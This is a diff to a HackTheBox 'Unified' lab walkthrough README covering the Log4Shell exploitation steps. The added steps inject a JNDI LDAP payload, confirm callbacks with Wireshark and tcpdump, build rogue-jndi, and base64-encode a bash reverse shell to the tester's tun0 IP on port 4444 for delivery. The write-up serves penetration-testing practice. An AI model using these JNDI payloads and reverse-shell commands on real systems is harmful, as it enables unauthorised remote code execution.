@@ -139,22 +139,73 @@ In conclusion, the UniFi box was successfully compromised end-to-end. By exploit
   ```
   ## Step 10
   ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/1709021dbb59ca2e4df1f5dee83879fd81083883/10%20change%20the%20payload%20with%20host%20tun0%20host%20ip%20to%20see%20from%20wireshark%20.png)
-  # Changing the payload with Tun0 host IP in the remember section vulnerable parameter 
+  # Changing the malicious payload with the Tun0 host IP in the remember section vulnerable parameter 
   ```bash
   "${jndi:ldap://10.10.16.87/whatever}",
   ```
-  
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
-  ### ![image_alt](
+  ## Step 11
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/11%20tcp%20tun0%20and%20ldap%20deauflt%20port389%20to%20see%20source%20ip%20and%20distination%20.png)
+  # After changing to a malicious payload using Wireshark to analyze traffic on the LDAP default port 389
+  ## Step 12 
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/12%20send%20the%20request%20again%20to%20see%20in%20wireshark%20.png)
+  # Send the request again to confirm LDAP callbacks from the target machine
+  ## Step 13
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/13%20host%20and%20target%20machine%20is%20talking%20eachother%20.png)
+  # By examining the source and destination ports, I verified that communication between the host and target machines was established successfully
+  ## Step 14
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/14%20tcpdump%20to%20analyze%20the%20trafic.png)
+  # I also used tcpdump to analyze the traffic and confirmed that the host and target machines are communicating with each other. (It is not necessary to use both tcpdump and Wireshark; either tool can be used)
+  ```bash
+  sudo tcpdump -i tun0 port 389
+  ```
+  ## Step 15
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e4c62d1beca8d9482209d0bbae0db5622fda0f21/15%20install%20openjdk-11-jdk.png)
+  # Install openjdk
+  ```bash
+  sudo install openjdk-11-jdk -y
+  ```
+  ```bash
+  java -version
+  ```
+  ## Step 16
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/6eac844362a947431c6d8a40e94c14f1c125bdd5/16%20install%20maven%20and%20see%20the%20version.png)
+  # Install maven
+  ```bash
+  sudo apt-get install maven
+  ```
+  ```bash
+  mvn -v
+  ```
+  ## Step 17
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/a0ab52c8e49a161bc98ee53a53f6ab3e9f5678a6/17%20Rogue-jndi%20copy%20from%20github%20to%20clone%20repo.png)
+  # After installing the required package now need to download and build rogue-jndi
+  ```bash
+  git clone https://github.com/veracode-research/rogue-jndi
+  ```
+  ## Step 18
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/ef2f63626698358e0707d80a6ec8e2b515503c11/18%20rogue-jndi%20package%20building%20.png)
+  # rouge-jndi package building
+  ```bash
+  cd rogue-jndi
+  ```
+  ```bash
+  mvn package
+  ```
+  ## Step 19
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/41164ddfc7edc3a334987fa26713c926befa8887/20%20copy%20that%20has%20file%20to%20create%20jar.png)
+  # rogue-jndi is successfully built up
+  ## Step 20
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/41164ddfc7edc3a334987fa26713c926befa8887/20%20copy%20that%20has%20file%20to%20create%20jar.png)
+  # Using the Rogue-JNDI server requires creating a payload that, when delivered, provides shell access to the vulnerable system. To mitigate encoding errors, the payload will be encoded in Base64
+  ```bash
+  echo 'bash -c bash -i >&/dev/tcp/10.10.16.87/4444 0>&1' | base64
+  ```
+  ## Step 21
+  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/32083b372e7853eecb3a4f67e02e63cd5f4e7dd6/21%20rouge%20jndi%20made%20java-jar%20and%20target%20and%20copy%20that%20ldap%20mapping%20and%20repace%20it%20in%20remember%20section%20payload.png)
+  # Once the payload is created, launch the Rogue-JNDI application by specifying the payload with the --command option and providing your tun0 IP address with the --hostname option
+  ```bash
+  java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuODcvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.87"
+  ```
   ### ![image_alt](
   ### ![image_alt](
   ### ![image_alt](
